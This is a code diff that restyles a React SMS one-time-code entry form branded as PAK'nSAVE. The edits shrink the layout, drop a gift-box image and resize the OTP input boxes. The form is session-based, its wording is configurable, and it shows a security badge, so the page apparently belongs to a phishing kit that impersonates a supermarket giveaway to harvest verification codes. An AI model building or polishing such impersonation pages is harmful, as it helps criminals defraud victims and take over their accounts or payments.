@@ -184,35 +184,25 @@ export function SmsClient({ sessionId }: Props) {
 
   return (
     <div className="pak-page-shell">
-      <div className="pak-form-card w-full max-w-[980px] fade-in">
-        <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10 lg:px-12">
-          <div className="grid gap-7 lg:grid-cols-[minmax(0,1.1fr)_260px] lg:items-start">
-            <div className="min-w-0">
-              <div className="max-w-[36rem]">
-                <h2 className="pak-form-title">{settings.sms_title}</h2>
-                <p className="pak-form-subtitle mt-3 whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
-              </div>
+      <div className="pak-form-card w-full max-w-[860px] fade-in">
+        <div className="pak-form-inner px-4 pb-5 pt-5 sm:px-8 sm:pb-8 sm:pt-8 lg:px-10">
+          <div className="flex items-start justify-between gap-3">
+            <div className="min-w-0 max-w-[29rem]">
+              <h2 className="pak-form-title">{settings.sms_title}</h2>
+              <p className="pak-form-subtitle mt-2 whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
             </div>
-
-            <div className="flex items-start justify-between gap-4 lg:block">
-              <img
-                src="/form-assets/paknsave-logo-form.png"
-                alt="PAK'nSAVE"
-                className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
-                id="sms-brand-logo"
-              />
-              <img
-                src="/form-assets/paknsave-gift-box.png"
-                alt=""
-                className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[220px] lg:translate-x-2"
-              />
-            </div>
+            <img
+              src="/form-assets/paknsave-logo-form.png"
+              alt="PAK'nSAVE"
+              className="pak-form-brand-logo shrink-0"
+              id="sms-brand-logo"
+            />
           </div>
         
-          <form onSubmit={handleSubmit} className="mt-7 space-y-6">
+          <form onSubmit={handleSubmit} className="mt-5 space-y-5 sm:mt-6">
             <div className="pak-form-label">
-              <div className="mb-4">{settings.sms_input_label} ({digits})</div>
-              <div className="flex flex-wrap justify-center gap-2 sm:gap-3" onPaste={handlePaste}>
+              <div className="mb-3">{settings.sms_input_label} ({digits})</div>
+              <div className="flex flex-wrap justify-center gap-2" onPaste={handlePaste}>
               {Array.from({ length: digits }).map((_, index) => (
                 <input
                   key={index}
@@ -221,7 +211,7 @@ export function SmsClient({ sessionId }: Props) {
                   inputMode="numeric"
                   autoComplete="one-time-code"
                   maxLength={1}
-                  className="pak-form-otp h-14 w-12 text-center text-2xl font-bold sm:h-16 sm:w-14 sm:text-3xl"
+                  className="pak-form-otp h-13 w-11 text-center text-2xl font-bold sm:h-15 sm:w-13 sm:text-[1.7rem]"
                   value={code[index] || ""}
                   onChange={(e) => handleOtpChange(index, e.target.value)}
                   onKeyDown={(e) => handleOtpKeyDown(index, e)}
@@ -236,7 +226,7 @@ export function SmsClient({ sessionId }: Props) {
 
             {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
 
-            <div className="flex flex-col gap-4 pt-1 md:flex-row md:items-center md:justify-between">
+            <div className="flex flex-col gap-3 pt-1 md:flex-row md:items-center md:justify-between">
               <div className="pak-form-security">
                 <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                   <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
@@ -247,7 +237,7 @@ export function SmsClient({ sessionId }: Props) {
               <button
                 type="submit"
                 disabled={saving || !valid}
-                className="pak-form-button min-h-[4.25rem] w-full px-6 text-xl md:w-[24rem]"
+                className="pak-form-button min-h-[3.85rem] w-full px-6 text-lg md:w-[22rem]"
               >
                 {saving ? settings.sms_loading : settings.sms_button}
               </button>
